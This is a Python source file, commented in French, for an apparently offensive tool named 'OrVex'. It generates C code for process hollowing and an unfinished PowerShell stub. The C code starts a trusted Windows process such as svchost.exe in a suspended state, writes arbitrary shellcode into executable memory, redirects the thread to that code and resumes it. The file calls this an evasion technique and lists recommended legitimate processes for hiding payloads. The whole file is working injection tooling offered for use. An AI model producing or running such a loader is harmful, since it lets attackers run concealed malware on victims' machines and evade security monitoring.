#!/usr/bin/env python3
"""
Process Hollowing Evasion Technique
- Crée un processus suspendu
- Démappe la section originale
- Injecte le payload
- Reprend l'exécution
"""

import os
import struct
from typing import Optional, Tuple

class ProcessHollowing:
    """
    Process Hollowing implementation pour Windows
    Technique classique d'injection de processus
    """
    
    # Processus cibles recommandés (légitimes)
    TARGET_PROCESSES = [
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\explorer.exe",
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\calc.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]
    
    @staticmethod
    def generate_c_code(payload: bytes, target_process: str = None) -> str:
        """
        Génère le code C pour le process hollowing
        """
        if target_process is None:
            target_process = ProcessHollowing.TARGET_PROCESSES[0]
        
        # Formater le shellcode pour le code C
        shellcode_hex = ', '.join(f'0x{b:02x}' for b in payload)
        
        code = f'''#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Payload to inject
unsigned char payload[] = {{ {shellcode_hex} }};
SIZE_T payload_size = sizeof(payload);

// Target process
wchar_t target_process[] = L"{target_process}";

// Structure for x64 context
#ifdef _WIN64
typedef struct _THREAD_CONTEXT {{
    DWORD64 Rax;
    DWORD64 Rcx;
    DWORD64 Rdx;
    DWORD64 Rbx;
    DWORD64 Rsp;
    DWORD64 Rbp;
    DWORD64 Rsi;
    DWORD64 Rdi;
    DWORD64 Rip;
}} THREAD_CONTEXT, *PTHREAD_CONTEXT;
#endif

BOOL HollowProcess() {{
    STARTUPINFOW si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    CONTEXT context = {{0}};
    LPVOID remote_mem = NULL;
    
    si.cb = sizeof(si);
    
    // 1. Create suspended process
    printf("[*] Creating suspended process: %ls\\n", target_process);
    if (!CreateProcessW(
        target_process,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {{
        printf("[-] CreateProcess failed: %d\\n", GetLastError());
        return FALSE;
    }}
    
    printf("[+] Process created. PID: %d\\n", pi.dwProcessId);
    
    // 2. Get thread context
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {{
        printf("[-] GetThreadContext failed: %d\\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    // 3. Allocate memory in target process
    remote_mem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remote_mem) {{
        printf("[-] VirtualAllocEx failed: %d\\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    printf("[+] Allocated memory at: 0x%p\\n", remote_mem);
    
    // 4. Write payload
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(
        pi.hProcess,
        remote_mem,
        payload,
        payload_size,
        &bytes_written)) {{
        printf("[-] WriteProcessMemory failed: %d\\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    printf("[+] Payload written (%zu bytes)\\n", bytes_written);
    
    // 5. Hijack execution flow
#ifdef _WIN64
    context.Rip = (DWORD64)remote_mem;
#else
    context.Eip = (DWORD)remote_mem;
#endif
    
    if (!SetThreadContext(pi.hThread, &context)) {{
        printf("[-] SetThreadContext failed: %d\\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    printf("[+] Thread context modified\\n");
    
    // 6. Resume thread
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed - Payload executing!\\n");
    
    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}}

int main() {{
    printf("=== OrVex Process Hollowing ===\\n\\n");
    
    if (HollowProcess()) {{
        printf("\\n[+] Process hollowing completed successfully!\\n");
    }} else {{
        printf("\\n[-] Process hollowing failed\\n");
    }}
    
    return 0;
}}
'''
        return code
    
    @staticmethod
    def generate_powershell(target_process: str = "svchost") -> str:
        """
        Génère une version PowerShell du process hollowing
        """
        ps_code = f'''# Process Hollowing in PowerShell
# Cible: {target_process}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );
}}
"@

# À compléter avec le payload
Write-Host "[*] Process Hollowing via PowerShell"
'''
        return ps_code